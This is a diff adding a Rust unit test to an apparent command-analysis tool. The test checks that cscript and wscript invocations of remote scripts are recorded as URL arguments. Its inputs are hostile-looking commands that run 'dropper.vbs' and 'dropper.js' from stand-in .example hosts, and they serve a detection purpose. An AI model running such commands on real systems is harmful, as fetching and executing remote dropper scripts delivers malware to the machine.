@@ -9438,6 +9438,32 @@ mod cscript_tests {
             "js not extracted"
         );
     }
+
+    #[test]
+    fn script_hosts_emit_url_argument_for_remote_script_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"cscript //nologo "https://script-host.example/dropper.vbs""#,
+            &mut env,
+        );
+        interpret_line(
+            r#"wscript "script-host-schemeless.example/dropper.js""#,
+            &mut env,
+        );
+
+        for expected in [
+            "https://script-host.example/dropper.vbs",
+            "http://script-host-schemeless.example/dropper.js",
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlArgument { url, .. } if url == expected)),
+                "missing script-host UrlArgument for {expected}: {:?}",
+                env.traits
+            );
+        }
+    }
 }
 
 #[cfg(test)]
